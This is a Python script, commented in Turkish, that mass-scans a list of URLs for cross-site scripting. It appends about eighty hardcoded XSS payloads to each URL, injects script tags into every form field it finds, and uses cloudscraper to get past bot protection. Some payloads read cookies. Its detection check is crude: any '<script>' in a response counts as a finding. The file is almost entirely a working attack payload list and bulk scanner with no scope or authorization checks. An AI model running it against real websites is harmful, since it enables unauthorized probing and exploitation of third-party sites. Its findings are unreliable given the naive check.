import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import argparse
import cloudscraper


def xss_scan(url, method='GET', data=None, headers=None):
    try:
        scraper = cloudscraper.create_scraper()  # CloudScraper nesnesi oluşturuluyor
        if method == 'GET':
            response = scraper.get(url, headers=headers)
        elif method == 'POST':
            response = scraper.post(url, data=data, headers=headers)
        else:
            print(f"Geçersiz HTTP metodu: {method}")
            return None

        if response.status_code == 200:
            if "<script>" in response.text:
                output = f"XSS zafiyeti bulundu: {url}\nİlgili Sayfa: {url}\nPayload: {data}\n"
                return output
            else:
                return None
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Hata oluştu: {e}")
        return None

def generate_xss_vectors(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    xss_vectors = [
        # Temel XSS vektörleri
        f"{base_url}'\"><script>alert('XSS')</script>",
        f"{base_url}'><script>alert('XSS')</script>",
        # Temel XSS vektörleri (farklı tagler)
        f"{base_url}'><svg/onload=alert('XSS')>",
        f"{base_url}'><img/src='x'/onerror='alert(\"XSS\")'>",
        # Event Handler XSS vektörleri
        f"{base_url}' onmouseover=alert('XSS')>",
        f"{base_url}' onload=alert('XSS')>",
        # JavaScript içinde XSS vektörleri
        f"{base_url}'-alert('XSS')-",
        f"{base_url};alert('XSS')//",
        # VBScript ile XSS vektörleri
        f"{base_url}'><script>alert('XSS')</script><'",
        f"{base_url}'><script>alert(String.fromCharCode(88,83,83))</script>",
        # CSS ile XSS vektörleri
        f"{base_url}' style=\"expression(alert('XSS'))\"",
        f"{base_url}' style=\"background-image:url(javascript:alert('XSS'));\"",
        # URL içinde XSS vektörleri
        f"{base_url}?<script>alert('XSS')</script>",
        f"{base_url}#'><script>alert('XSS')</script>",
        # Meta tag içinde XSS vektörleri
        f"{base_url}'><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
        f"{base_url}'><meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        # İmge tag içinde XSS vektörleri
        f"{base_url}'><img src=\"javascript:alert('XSS');\">",
        f"{base_url}'><img src=\"x\" onerror=\"alert('XSS');\">",
        # Iframe içinde XSS vektörleri
        f"{base_url}'><iframe src=\"javascript:alert('XSS');\"></iframe>",
        f"{base_url}'><iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        # İnput tag içinde XSS vektörleri
        f"{base_url}'><input type=\"image\" src=\"javascript:alert('XSS');\">",
        f"{base_url}'><input type=\"text\" value=\"<xss>\" onfocus=\"alert('XSS');\">",
        # Şemaları içeren XSS vektörleri
        f"{base_url}'><script src=\"data:text/javascript,alert('XSS');\"></script>",
        f"{base_url}'><script src=\"data:text/javascript;base64,YWxlcnQoJ1hTUycp\"></script>",
        # SVG içinde XSS vektörleri
        f"{base_url}'><svg/onload=alert('XSS')>",
        f"{base_url}'><svg/onload='javascript:alert(\"XSS\")'>",
        # Param içinde XSS vektörleri
        f"{base_url}'><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://your.site/your.swf\" type=\"application/x-shockwave-flash\"></embed>",
        f"{base_url}'><param name=\"movie\" value=\"http://your.site/your.swf\" /><embed src=\"http://your.site/your.swf\" type=\"application/x-shockwave-flash\" AllowScriptAccess=\"always\"></embed>",
        # VBScript içinde XSS vektörleri
        f"{base_url}'><script language=\"VBScript\">msgbox(\"XSS\")</script>",
        f"{base_url}'><script language='VBScript'>eval(Request(\"XSS\"))</script>",
        # Eval içinde XSS vektörleri
        f"{base_url}'><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        f"{base_url}'><script>eval(String.fromCharCode(88,83,83))</script>",
        # Expression içinde XSS vektörleri
        f"{base_url}' style=\"width: expression(alert('XSS'));\"",
        f"{base_url}' style=\"width: expression(alert('XSS'))\"",
        # Div içinde XSS vektörleri
        f"{base_url}'><div style=\"position:absolute;left:0;top:0;width:100%;height:100%\" onmouseover=alert(1)></div>",
        f"{base_url}'><div style=position:fixed;top:0;left:0;width:100%;height:100% onmouseover=alert(1)></div>",
        # VBScript içinde XSS vektörleri
        f"{base_url}'><script language='VBScript'>msgbox(\"XSS\")</script>",
        f"{base_url}'><script language='VBScript'>eval(Request(\"XSS\"))</script>",
        f"{base_url}?cat=<script>prompt(5000/200)</script>",
        f"{base_url}?'><script>alert('XSS')</script>",
        f"{base_url}?'\"<script>alert('XSS')</script>",
        f"{base_url}?'<img src=x onerror=alert('XSS')>",
        f"{base_url}?' onmouseover=alert('XSS')",
        f"{base_url}?' onfocus=alert('XSS')",
        f"{base_url}?'><iframe onload=alert('XSS')></iframe>",
        f"{base_url}?'><body onscroll=alert('XSS')></body>",
        f"{base_url}?'><object onerror=alert('XSS')></object>",
        f"{base_url}?'><applet code=alert('XSS')></applet>",
        f"{base_url}?'><isindex type=image src= onerror=alert('XSS')>",
        f"{base_url}?'><svg/onload=alert('XSS')>",
        f"{base_url}?'><svg/onload='javascript:alert(\"XSS\")'>",
        f"{base_url}?'><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
        f"{base_url}?'><meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        f"{base_url}?'><img src=\"javascript:alert('XSS');\">",
        f"{base_url}?'><iframe src=\"javascript:alert('XSS');\"></iframe>",
        f"{base_url}?'><input type=\"image\" src=\"javascript:alert('XSS');\">",
        f"{base_url}?'><input type=\"text\" value=\"<xss>\" onfocus=\"alert('XSS');\">",
        f"{base_url}?'><script src=\"data:text/javascript,alert('XSS');\"></script>",
        f"{base_url}?'><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://your.site/your.swf\" type=\"application/x-shockwave-flash\"></embed>",
        f"{base_url}?'><param name=\"movie\" value=\"http://your.site/your.swf\" /><embed src=\"http://your.site/your.swf\" type=\"application/x-shockwave-flash\" AllowScriptAccess=\"always\"></embed>",
        f"{base_url}?'><script language=\"VBScript\">msgbox(\"XSS\")</script>",
        f"{base_url}?'><script language='VBScript'>eval(Request(\"XSS\"))</script>",
        f"{base_url}?'><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        f"{base_url}?'><script>eval(String.fromCharCode(88,83,83))</script>",
        f"{base_url}?' style=\"width: expression(alert('XSS'));\"",
        f"{base_url}?' style=\"width: expression(alert('XSS'))\"",
        f"{base_url}?'><div style=\"position:absolute;left:0;top:0;width:100%;height:100%\" onmouseover=alert(1)></div>",
        f"{base_url}?'><div style=position:fixed;top:0;left:0;width:100%;height:100% onmouseover=alert(1)></div>",
        f"{base_url}?'><script language='VBScript'>msgbox(\"XSS\")</script>",
        f"{base_url}?'><script language='VBScript'>eval(Request(\"XSS\"))</script>",
        f"{base_url}?cat=<script>prompt(5000/200)</script>",
        f"{base_url}?'><script>alert(document.cookie)</script>",
        f"{base_url}?%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}?%27%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}?%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}'%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}'%27%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}'%3Cscript%3Ealert('XSS')%3C/script%3E",
        f"{base_url}?'+String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)+`",
        f"{base_url}?';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));",
        f"{base_url}?<div style=\"width:1px;height:1px;position:absolute;left:0;top:0;background-color:red\" onmouseover=alert('XSS')></div>",
        # Daha fazla XSS vektörü eklenebilir
    ]
    return xss_vectors

def extract_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        form_data = []
        for form in forms:
            data = {}
            action = form.get('action', '')
            if action.startswith('http'):
                form_url = action
            else:
                form_url = urljoin(url, action)
            # 'input' dışındaki diğer etiketler de kontrol edilebilir
            for tag in form.find_all(['input', 'textarea', 'select']):
                if tag.get('name'):
                    data[tag.get('name')] = '"><script>alert("XSS")</script>'
            form_data.append((form_url, data))
        return form_data
    except requests.exceptions.RequestException as e:
        print(f"Hata oluştu: {e}")
        return []

def detailed_xss_scan(url):
    xss_vectors = generate_xss_vectors(url)
    forms = extract_forms(url)
    xss_found = False
    output = ""
    with ThreadPoolExecutor(max_workers=10) as executor:
        # XSS vektörlerini tarayıcıya gönder
        for vector in xss_vectors:
            result = xss_scan(vector)
            if result:
                output += result
                xss_found = True
        # Formları tarayıcıya gönder
        for form in forms:
            for method in ['GET', 'POST']:
                result = xss_scan(url=form[0], method=method, data=form[1])
                if result:
                    output += result
                    xss_found = True
    if xss_found:
        return output
    else:
        return None

def main():
    parser = argparse.ArgumentParser(description="XSS zafiyet tarama aracı")
    parser.add_argument("-L", "--list", help="Name of txt file containing URLs", required=True)
    parser.add_argument("-o", "--output", help="Name of the file to save the output", required=True)
    
    args = parser.parse_args()
    outputs = []

    with open(args.list, 'r') as file:
        urls = file.readlines()
        for url in urls:
            url = url.strip()
            if not url.startswith('http'):
                url = 'http://' + url
            result = detailed_xss_scan(url)
            if result:
                outputs.append(result)

    with open(args.output, 'w') as outfile:
        for output in outputs:
            outfile.write(output)

if __name__ == "__main__":
    main()